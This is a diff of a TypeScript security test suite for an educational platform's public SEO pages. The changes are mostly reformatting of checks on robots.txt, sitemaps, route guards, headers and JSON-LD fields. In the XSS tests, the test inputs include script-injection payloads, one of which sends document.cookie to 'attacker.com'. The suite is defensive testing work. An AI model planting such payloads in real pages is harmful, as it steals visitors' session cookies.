@@ -86,7 +86,9 @@ describe('AEO Security — robots.txt', () => {
   it('sets Crawl-delay for AI bots to prevent load spikes', () => {
     expect(robotsContent).toContain('Crawl-delay:');
     // Crawl-delay for AI bots should be >= 5 seconds
-    const crawlDelayMatches = [...robotsContent.matchAll(/Crawl-delay:\s*(\d+)/g)];
+    const crawlDelayMatches = [
+      ...robotsContent.matchAll(/Crawl-delay:\s*(\d+)/g),
+    ];
     expect(crawlDelayMatches.length).toBeGreaterThan(0);
     crawlDelayMatches.forEach((match) => {
       const delay = parseInt(match[1], 10);
@@ -110,7 +112,9 @@ describe('AEO Security — robots.txt', () => {
   });
 
   it('uses only the canonical public domain in Sitemap URL', () => {
-    const sitemapLine = robotsContent.split('\n').find((l) => l.startsWith('Sitemap:'));
+    const sitemapLine = robotsContent
+      .split('\n')
+      .find((l) => l.startsWith('Sitemap:'));
     if (sitemapLine) {
       // Must start with https
       expect(sitemapLine).toMatch(/Sitemap:\s*https:\/\//);
@@ -124,7 +128,7 @@ describe('AEO Security — robots.txt', () => {
     const adminSpecificPaths = robotsContent.match(/Disallow:.*\/admin\/\w+/g);
     // It's acceptable to have zero specific sub-paths (blanket rule only)
     // Having more than 3 specific sub-paths suggests over-enumeration
-    expect((adminSpecificPaths?.length ?? 0)).toBeLessThanOrEqual(3);
+    expect(adminSpecificPaths?.length ?? 0).toBeLessThanOrEqual(3);
   });
 });
 
@@ -274,7 +278,10 @@ describe('AEO Security — JSON-LD script injection prevention', () => {
     function safeJsonLd(data: object): string {
       return JSON.stringify(data).replace(/<\//g, '<\\/');
     }
-    const legit = { title: 'Introduction to Machine Learning', description: 'A beginner course.' };
+    const legit = {
+      title: 'Introduction to Machine Learning',
+      description: 'A beginner course.',
+    };
     const result = safeJsonLd(legit);
     expect(result).toContain('Introduction to Machine Learning');
     expect(result).toContain('A beginner course.');
@@ -305,12 +312,17 @@ describe('AEO Security — JSON-LD script injection prevention', () => {
       {
         '@type': 'Question',
         name: 'What is EduSphere?',
-        acceptedAnswer: { '@type': 'Answer', text: 'EduSphere is an AI-powered LMS.' },
+        acceptedAnswer: {
+          '@type': 'Answer',
+          text: 'EduSphere is an AI-powered LMS.',
+        },
       },
     ];
     faqItems.forEach((item) => {
       // Answers must not contain email addresses or phone numbers
-      expect(item.acceptedAnswer.text).not.toMatch(/[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}/i);
+      expect(item.acceptedAnswer.text).not.toMatch(
+        /[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}/i
+      );
       expect(item.acceptedAnswer.text).not.toMatch(/\+?\d[\d\s\-().]{7,}/);
     });
   });
@@ -321,7 +333,12 @@ describe('AEO Security — JSON-LD script injection prevention', () => {
 describe('AEO Security — Canonical URL safety', () => {
   it('canonical URLs must start with the expected production domain', () => {
     const BASE_URL = 'https://app.edusphere.dev';
-    const paths = ['/faq', '/features/knowledge-graph', '/glossary', '/pricing'];
+    const paths = [
+      '/faq',
+      '/features/knowledge-graph',
+      '/glossary',
+      '/pricing',
+    ];
     paths.forEach((path) => {
       const canonical = `${BASE_URL}${path}`;
       expect(canonical).toMatch(/^https:\/\/app\.edusphere\.dev/);
@@ -355,9 +372,19 @@ describe('AEO Security — Canonical URL safety', () => {
     const content = readFileSync(sitemapPath, 'utf-8');
     // These paths must never appear in sitemap
     const forbiddenPaths = [
-      '/dashboard', '/admin', '/settings', '/profile', '/courses/',
-      '/agents', '/annotations', '/oauth', '/graphql', '/api/',
-      '/checkout', '/onboarding', '/lti/',
+      '/dashboard',
+      '/admin',
+      '/settings',
+      '/profile',
+      '/courses/',
+      '/agents',
+      '/annotations',
+      '/oauth',
+      '/graphql',
+      '/api/',
+      '/checkout',
+      '/onboarding',
+      '/lti/',
     ];
     forbiddenPaths.forEach((path) => {
       expect(content).not.toContain(`<loc>${path}`);
@@ -399,8 +426,12 @@ describe('AEO Security — AeoController requirements', () => {
       // Must either filter by published status OR return only static (non-DB) data
       // Static catalog services (getCatalog, getFeatures, getFaq) are safe -- they
       // return hardcoded data without DB queries.
-      const isStaticOnly = !content.includes('withTenantContext') && !content.includes('.execute(');
-      expect(isStaticOnly || /published|status.*public|static|catalog/i.test(content)).toBe(true);
+      const isStaticOnly =
+        !content.includes('withTenantContext') &&
+        !content.includes('.execute(');
+      expect(
+        isStaticOnly || /published|status.*public|static|catalog/i.test(content)
+      ).toBe(true);
     });
   });
 
@@ -420,7 +451,10 @@ describe('AEO Security — AeoController requirements', () => {
 
 describe('AEO Security — Gateway rate limiting', () => {
   it('rate limiter middleware exists and covers all requests', () => {
-    const rateLimitPath = resolve(ROOT, 'apps/gateway/src/middleware/rate-limit.ts');
+    const rateLimitPath = resolve(
+      ROOT,
+      'apps/gateway/src/middleware/rate-limit.ts'
+    );
     expect(existsSync(rateLimitPath)).toBe(true);
   });
 
@@ -450,7 +484,10 @@ describe('AEO Security — Gateway rate limiting', () => {
   });
 
   it('security headers middleware applies HSTS', () => {
-    const headersPath = resolve(ROOT, 'apps/gateway/src/middleware/security-headers.ts');
+    const headersPath = resolve(
+      ROOT,
+      'apps/gateway/src/middleware/security-headers.ts'
+    );
     expect(existsSync(headersPath)).toBe(true);
     const content = readFileSync(headersPath, 'utf-8');
     expect(content).toContain('Strict-Transport-Security');
@@ -458,7 +495,10 @@ describe('AEO Security — Gateway rate limiting', () => {
   });
 
   it('security headers middleware sets X-Frame-Options: DENY', () => {
-    const headersPath = resolve(ROOT, 'apps/gateway/src/middleware/security-headers.ts');
+    const headersPath = resolve(
+      ROOT,
+      'apps/gateway/src/middleware/security-headers.ts'
+    );
     if (!existsSync(headersPath)) return;
     const content = readFileSync(headersPath, 'utf-8');
     expect(content).toContain('X-Frame-Options');
@@ -466,7 +506,10 @@ describe('AEO Security — Gateway rate limiting', () => {
   });
 
   it('security headers middleware sets X-Content-Type-Options: nosniff', () => {
-    const headersPath = resolve(ROOT, 'apps/gateway/src/middleware/security-headers.ts');
+    const headersPath = resolve(
+      ROOT,
+      'apps/gateway/src/middleware/security-headers.ts'
+    );
     if (!existsSync(headersPath)) return;
     const content = readFileSync(headersPath, 'utf-8');
     expect(content).toContain('X-Content-Type-Options');
@@ -505,27 +548,39 @@ describe('AEO Security — Public route isolation', () => {
   });
 
   it('/dashboard is wrapped in guarded() (ProtectedRoute)', () => {
-    expect(routerContent).toMatch(/path:\s*['"]\/dashboard['"]\s*,[\s\S]{0,100}guarded/);
+    expect(routerContent).toMatch(
+      /path:\s*['"]\/dashboard['"]\s*,[\s\S]{0,100}guarded/
+    );
   });
 
   it('/admin is wrapped in guarded()', () => {
-    expect(routerContent).toMatch(/path:\s*['"]\/admin['"]\s*,[\s\S]{0,100}guarded/);
+    expect(routerContent).toMatch(
+      /path:\s*['"]\/admin['"]\s*,[\s\S]{0,100}guarded/
+    );
   });
 
   it('/settings is wrapped in guarded()', () => {
-    expect(routerContent).toMatch(/path:\s*['"]\/settings['"]\s*,[\s\S]{0,100}guarded/);
+    expect(routerContent).toMatch(
+      /path:\s*['"]\/settings['"]\s*,[\s\S]{0,100}guarded/
+    );
   });
 
   it('/courses is wrapped in guarded()', () => {
-    expect(routerContent).toMatch(/path:\s*['"]\/courses['"]\s*,[\s\S]{0,100}guarded/);
+    expect(routerContent).toMatch(
+      /path:\s*['"]\/courses['"]\s*,[\s\S]{0,100}guarded/
+    );
   });
 
   it('/agents is wrapped in guarded()', () => {
-    expect(routerContent).toMatch(/path:\s*['"]\/agents['"]\s*,[\s\S]{0,100}guarded/);
+    expect(routerContent).toMatch(
+      /path:\s*['"]\/agents['"]\s*,[\s\S]{0,100}guarded/
+    );
   });
 
   it('/checkout is wrapped in guarded()', () => {
-    expect(routerContent).toMatch(/path:\s*['"]\/checkout['"]\s*,[\s\S]{0,100}guarded/);
+    expect(routerContent).toMatch(
+      /path:\s*['"]\/checkout['"]\s*,[\s\S]{0,100}guarded/
+    );
   });
 
   it('/landing is public (no guarded wrapper)', () => {
@@ -608,7 +663,8 @@ describe('AEO Security — /catalog page content safety', () => {
     if (!existsSync(filePath)) return;
     const content = readFileSync(filePath, 'utf-8');
     expect(content).not.toMatch(/tenantId/);
-    const uuidPattern = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
+    const uuidPattern =
+      /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
     expect(content.match(uuidPattern)).toBeNull();
   });
 
@@ -620,7 +676,10 @@ describe('AEO Security — /catalog page content safety', () => {
   });
 
   it('CourseSchema component uses safeJsonLd helper (not raw JSON.stringify)', () => {
-    const schemaPath = resolve(ROOT, 'apps/web/src/components/seo/CourseSchema.tsx');
+    const schemaPath = resolve(
+      ROOT,
+      'apps/web/src/components/seo/CourseSchema.tsx'
+    );
     if (!existsSync(schemaPath)) return;
     const content = readFileSync(schemaPath, 'utf-8');
     expect(content).toContain('safeJsonLd');
@@ -628,10 +687,28 @@ describe('AEO Security — /catalog page content safety', () => {
   });
 
   it('CourseSchema JSON-LD does not include forbidden PII or internal fields', () => {
-    const allowedFields = ['@context', '@type', 'name', 'description', 'url', 'inLanguage',
-      'provider', 'thumbnailUrl', 'keywords', 'educationalLevel'];
-    const forbiddenFields = ['tenantId', 'enrollmentCount', 'instructorEmail',
-      'internalId', 'pricingTier', 'price', 'createdAt', 'updatedAt'];
+    const allowedFields = [
+      '@context',
+      '@type',
+      'name',
+      'description',
+      'url',
+      'inLanguage',
+      'provider',
+      'thumbnailUrl',
+      'keywords',
+      'educationalLevel',
+    ];
+    const forbiddenFields = [
+      'tenantId',
+      'enrollmentCount',
+      'instructorEmail',
+      'internalId',
+      'pricingTier',
+      'price',
+      'createdAt',
+      'updatedAt',
+    ];
     const exampleSchema: Record<string, unknown> = {
       '@context': 'https://schema.org',
       '@type': ['Course', 'LearningResource'],
@@ -639,7 +716,11 @@ describe('AEO Security — /catalog page content safety', () => {
       description: 'Build your first ML models.',
       url: 'https://app.edusphere.dev/catalog#intro-ml',
       inLanguage: 'en',
-      provider: { '@type': 'Organization', name: 'EduSphere', url: 'https://edusphere.dev' },
+      provider: {
+        '@type': 'Organization',
+        name: 'EduSphere',
+        url: 'https://edusphere.dev',
+      },
       keywords: 'machine learning, python',
       educationalLevel: 'Beginner',
     };
@@ -651,17 +732,24 @@ describe('AEO Security — /catalog page content safety', () => {
 
 describe('AEO Security — /instructors page content safety', () => {
   it('InstructorDirectoryPage does not expose real user IDs or auth tokens', () => {
-    const filePath = resolve(ROOT, 'apps/web/src/pages/InstructorDirectoryPage.tsx');
+    const filePath = resolve(
+      ROOT,
+      'apps/web/src/pages/InstructorDirectoryPage.tsx'
+    );
     if (!existsSync(filePath)) return;
     const content = readFileSync(filePath, 'utf-8');
     expect(content).not.toMatch(/bearer\s+[a-zA-Z0-9._-]{20,}/i);
     expect(content).not.toMatch(/Authorization:\s*['"][^'"]+['"]/i);
-    const uuidPattern = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
+    const uuidPattern =
+      /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
     expect(content.match(uuidPattern)).toBeNull();
   });
 
   it('InstructorDirectoryPage does not expose seeded user emails', () => {
-    const filePath = resolve(ROOT, 'apps/web/src/pages/InstructorDirectoryPage.tsx');
+    const filePath = resolve(
+      ROOT,
+      'apps/web/src/pages/InstructorDirectoryPage.tsx'
+    );
     if (!existsSync(filePath)) return;
     const content = readFileSync(filePath, 'utf-8');
     const seedEmails = [
@@ -675,14 +763,20 @@ describe('AEO Security — /instructors page content safety', () => {
   });
 
   it('InstructorDirectoryPage does not expose tenantId', () => {
-    const filePath = resolve(ROOT, 'apps/web/src/pages/InstructorDirectoryPage.tsx');
+    const filePath = resolve(
+      ROOT,
+      'apps/web/src/pages/InstructorDirectoryPage.tsx'
+    );
     if (!existsSync(filePath)) return;
     const content = readFileSync(filePath, 'utf-8');
     expect(content).not.toMatch(/tenantId/);
   });
 
   it('PersonSchema component uses safeJsonLd helper (not raw JSON.stringify)', () => {
-    const schemaPath = resolve(ROOT, 'apps/web/src/components/seo/PersonSchema.tsx');
+    const schemaPath = resolve(
+      ROOT,
+      'apps/web/src/components/seo/PersonSchema.tsx'
+    );
     if (!existsSync(schemaPath)) return;
     const content = readFileSync(schemaPath, 'utf-8');
     expect(content).toContain('safeJsonLd');
@@ -690,10 +784,29 @@ describe('AEO Security — /instructors page content safety', () => {
   });
 
   it('PersonSchema JSON-LD does not include forbidden fields', () => {
-    const allowedPersonFields = ['@context', '@type', 'name', 'jobTitle', 'url',
-      'image', 'description', 'sameAs', 'worksFor'];
-    const forbiddenPersonFields = ['email', 'telephone', 'taxID', 'vatID',
-      'password', 'token', 'secret', 'tenantId', 'userId', 'internalId'];
+    const allowedPersonFields = [
+      '@context',
+      '@type',
+      'name',
+      'jobTitle',
+      'url',
+      'image',
+      'description',
+      'sameAs',
+      'worksFor',
+    ];
+    const forbiddenPersonFields = [
+      'email',
+      'telephone',
+      'taxID',
+      'vatID',
+      'password',
+      'token',
+      'secret',
+      'tenantId',
+      'userId',
+      'internalId',
+    ];
     const examplePersonSchema: Record<string, unknown> = {
       '@context': 'https://schema.org',
       '@type': 'Person',
@@ -725,8 +838,13 @@ describe('AEO Security — JSON-LD XSS vectors in Phase 2 schemas', () => {
     function safeJsonLd(data: object): string {
       return JSON.stringify(data).replace(/<\//g, '<\\/');
     }
-    const maliciousDesc = 'Learn AI</script><script>document.location="https://evil.com"</script>';
-    const result = safeJsonLd({ '@type': 'Course', name: 'Safe Course', description: maliciousDesc });
+    const maliciousDesc =
+      'Learn AI</script><script>document.location="https://evil.com"</script>';
+    const result = safeJsonLd({
+      '@type': 'Course',
+      name: 'Safe Course',
+      description: maliciousDesc,
+    });
     expect(result).not.toContain('</script>');
   });
 
@@ -743,18 +861,27 @@ describe('AEO Security — JSON-LD XSS vectors in Phase 2 schemas', () => {
     function safeJsonLd(data: object): string {
       return JSON.stringify(data).replace(/<\//g, '<\\/');
     }
-    const maliciousDesc = 'Expert</script><script>fetch("https://attacker.com/steal?c="+document.cookie)</script>';
-    const result = safeJsonLd({ '@type': 'Person', name: 'Dr. X', description: maliciousDesc });
+    const maliciousDesc =
+      'Expert</script><script>fetch("https://attacker.com/steal?c="+document.cookie)</script>';
+    const result = safeJsonLd({
+      '@type': 'Person',
+      name: 'Dr. X',
+      description: maliciousDesc,
+    });
     expect(result).not.toContain('</script>');
   });
 
   it('/catalog and /instructors routes are NOT wrapped in guarded() in router', () => {
     const content = readAllRoutes();
     if (!content) return;
-    const catalogBlock = content.match(/path:\s*['"]\/catalog['"]\s*,[\s\S]{0,300}/);
+    const catalogBlock = content.match(
+      /path:\s*['"]\/catalog['"]\s*,[\s\S]{0,300}/
+    );
     expect(catalogBlock).not.toBeNull();
     if (catalogBlock) expect(catalogBlock[0]).not.toContain('guarded(');
-    const instructorsBlock = content.match(/path:\s*['"]\/instructors['"]\s*,[\s\S]{0,300}/);
+    const instructorsBlock = content.match(
+      /path:\s*['"]\/instructors['"]\s*,[\s\S]{0,300}/
+    );
     expect(instructorsBlock).not.toBeNull();
     if (instructorsBlock) expect(instructorsBlock[0]).not.toContain('guarded(');
   });
@@ -767,11 +894,15 @@ describe('AEO Security — ProtectedRoute implementation', () => {
 
   beforeAll(() => {
     const prPath = resolve(ROOT, 'apps/web/src/components/ProtectedRoute.tsx');
-    protectedRouteContent = existsSync(prPath) ? readFileSync(prPath, 'utf-8') : '';
+    protectedRouteContent = existsSync(prPath)
+      ? readFileSync(prPath, 'utf-8')
+      : '';
   });
 
   it('ProtectedRoute.tsx exists', () => {
-    expect(existsSync(resolve(ROOT, 'apps/web/src/components/ProtectedRoute.tsx'))).toBe(true);
+    expect(
+      existsSync(resolve(ROOT, 'apps/web/src/components/ProtectedRoute.tsx'))
+    ).toBe(true);
   });
 
   it('ProtectedRoute redirects unauthenticated users to /login', () => {
